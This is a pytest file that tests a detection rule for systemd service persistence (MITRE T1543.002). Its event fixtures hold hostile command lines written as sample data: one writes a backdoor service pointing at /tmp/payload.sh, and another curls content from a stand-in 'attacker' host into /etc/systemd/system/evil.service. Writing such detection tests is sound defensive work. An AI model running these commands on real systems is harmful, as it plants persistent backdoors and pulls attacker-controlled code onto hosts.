import pytest
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

RULE_ID = "linux_t1543_002_systemd_service_persistence"


@pytest.fixture
def engine():
    return YAMLDetectionEngine()


def _suspicious_service_creation_event():
    return {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {
            "path": "/etc/systemd/system/backdoor.service",
            "name": "backdoor.service",
        },
        "process": {
            "name": "bash",
            "command_line": (
                "bash -c \"echo 'ExecStart=/tmp/payload.sh'"
                " > /etc/systemd/system/backdoor.service\""
            ),
            "executable": "/usr/bin/bash",
            "parent": {"name": "sshd"},
        },
        "user": {"name": "root"},
        "host": {"name": "dev-vps"},
    }


def _systemctl_status_event():
    return {
        "event": {"category": "process", "type": "start", "action": "execve"},
        "process": {
            "name": "systemctl",
            "command_line": "systemctl status nginx",
            "executable": "/usr/bin/systemctl",
        },
        "user": {"name": "admin"},
        "host": {"name": "dev-vps"},
    }


def _systemctl_restart_event():
    return {
        "event": {"category": "process", "type": "start", "action": "execve"},
        "process": {
            "name": "systemctl",
            "command_line": "systemctl restart nginx",
            "executable": "/usr/bin/systemctl",
        },
        "user": {"name": "admin"},
        "host": {"name": "dev-vps"},
    }


def _benign_service_file_write_event():
    """Package manager modifying a legitimate service file — no suspicious indicators."""
    return {
        "event": {"category": "file", "type": "change", "action": "modified"},
        "file": {
            "path": "/etc/systemd/system/nginx.service",
            "name": "nginx.service",
        },
        "process": {
            "name": "dpkg",
            "command_line": "dpkg --configure nginx",
            "executable": "/usr/bin/dpkg",
            "parent": {"name": "apt"},
        },
        "user": {"name": "root"},
        "host": {"name": "dev-vps"},
    }


# ---------------------------------------------------------------------------
# Positive detection tests
# ---------------------------------------------------------------------------


def test_t1543_matches_suspicious_service_creation(engine):
    candidates = engine.evaluate_event(_suspicious_service_creation_event())
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None, f"Expected {RULE_ID} candidate"
    assert t1543.matched is True
    assert t1543.suppressed is False


def test_t1543_matches_bash_pipe_attack_pattern(engine):
    """
    Realistic curl|bash attack: the process that creates the service file is
    bash with command_line='bash' — no ExecStart= or /tmp/ in the command line.
    The rule must match via the process.name branch of the any condition.
    """
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {
            "path": "/etc/systemd/system/threatactor-backdoor.service",
            "name": "threatactor-backdoor.service",
        },
        "process": {
            "name": "bash",
            "command_line": "bash",
            "executable": "/bin/bash",
        },
        "user": {"name": "root"},
        "host": {"name": "prod1"},
    }
    candidates = engine.evaluate_event(event, return_unmatched=True)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None, f"Expected {RULE_ID} candidate"
    assert t1543.matched is True, (
        f"T1543.002 must match when bash creates a service file. "
        f"missing_fields={t1543.missing_fields} reasons={t1543.match_reasons}"
    )
    assert t1543.suppressed is False


# ---------------------------------------------------------------------------
# Negative detection tests
# ---------------------------------------------------------------------------


def test_t1543_no_match_systemctl_status(engine):
    candidates = engine.evaluate_event(_systemctl_status_event())
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is None or t1543.matched is False


def test_t1543_no_match_systemctl_restart(engine):
    candidates = engine.evaluate_event(_systemctl_restart_event())
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is None or t1543.matched is False


def test_t1543_no_match_benign_service_file_write(engine):
    """A legitimate .service file write with no suspicious payload indicators must not alert."""
    candidates = engine.evaluate_event(_benign_service_file_write_event())
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is None or t1543.matched is False


def test_t1543_package_manager_maintainer_script_suppressed(engine):
    """A dpkg maintainer script running `sh -c` touches the rule (shell process)
    but is suppressed as benign package-manager activity."""
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {
            "path": "/etc/systemd/system/myapp.service",
            "name": "myapp.service",
        },
        "process": {
            "name": "sh",
            "command_line": "sh -c 'systemctl daemon-reload'",
            "parent": {"name": "dpkg"},
        },
        "user": {"name": "root"},
        "host": {"name": "dev-vps"},
    }
    candidates = engine.evaluate_event(event)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.matched is True
    assert t1543.suppressed is True
    assert t1543.suppression_id == "benign_package_manager_service_write"


def test_t1543_attacker_service_write_not_suppressed(engine):
    """An attacker writing a service file via curl in a shell must NOT be
    suppressed even though a shell is involved."""
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {
            "path": "/etc/systemd/system/evil.service",
            "name": "evil.service",
        },
        "process": {
            "name": "bash",
            "command_line": "bash -c 'curl http://attacker/x > /etc/systemd/system/evil.service'",
            "parent": {"name": "sshd"},
        },
        "user": {"name": "root"},
        "host": {"name": "dev-vps"},
    }
    candidates = engine.evaluate_event(event)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.matched is True
    assert t1543.suppressed is False


# ---------------------------------------------------------------------------
# Metadata test
# ---------------------------------------------------------------------------


def test_t1543_rule_has_correct_mitre_metadata(engine):
    candidates = engine.evaluate_event(
        _suspicious_service_creation_event(), include_disabled=True
    )
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None, f"Expected {RULE_ID} candidate for metadata check"
    assert t1543.mitre.get("technique", {}).get("id") == "T1543"
    assert t1543.mitre.get("subtechnique", {}).get("id") == "T1543.002"
    assert t1543.mitre.get("tactic", {}).get("id") == "TA0003"


# ---------------------------------------------------------------------------
# Required-fields guard test
# ---------------------------------------------------------------------------


def test_t1543_skips_missing_file_path(engine):
    event = _suspicious_service_creation_event()
    del event["file"]

    candidates = engine.evaluate_event(event, return_unmatched=True)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.matched is False
    assert "file.path" in t1543.missing_fields


# ---------------------------------------------------------------------------
# v2.4.1 — Investigation evidence tests
# ---------------------------------------------------------------------------


def test_t1543_match_reasons_contain_systemd_path_evidence(engine):
    """match_reasons must reference the /etc/systemd/system/ path so the UI can show file.path evidence."""
    candidates = engine.evaluate_event(_suspicious_service_creation_event())
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.matched is True
    assert any("/etc/systemd/system/" in r for r in t1543.match_reasons), (
        f"Expected a match_reason referencing /etc/systemd/system/ — got: {t1543.match_reasons}"
    )


def test_t1543_match_reasons_present_for_minimal_bash_event(engine):
    """A minimal event where bash creates a .service file (no ExecStart in cmd_line) must still produce match_reasons."""
    event = {
        "event": {"category": "file", "type": "change", "action": "created"},
        "file": {
            "path": "/etc/systemd/system/threatactor-backdoor.service",
            "name": "threatactor-backdoor.service",
        },
        "process": {"name": "bash", "command_line": "bash"},
        "user": {"name": "root"},
        "host": {"name": "prod1"},
    }
    candidates = engine.evaluate_event(event)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.matched is True
    assert len(t1543.match_reasons) >= 1, "Evidence summary requires at least one match_reason"


def test_t1543_mitre_subtechnique_is_t1543_002(engine):
    """Regression guard: the rule's sub-technique ID must be T1543.002."""
    candidates = engine.evaluate_event(_suspicious_service_creation_event(), include_disabled=True)
    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert t1543 is not None
    assert t1543.mitre.get("subtechnique", {}).get("id") == "T1543.002", (
        f"Expected subtechnique T1543.002 — got: {t1543.mitre}"
    )
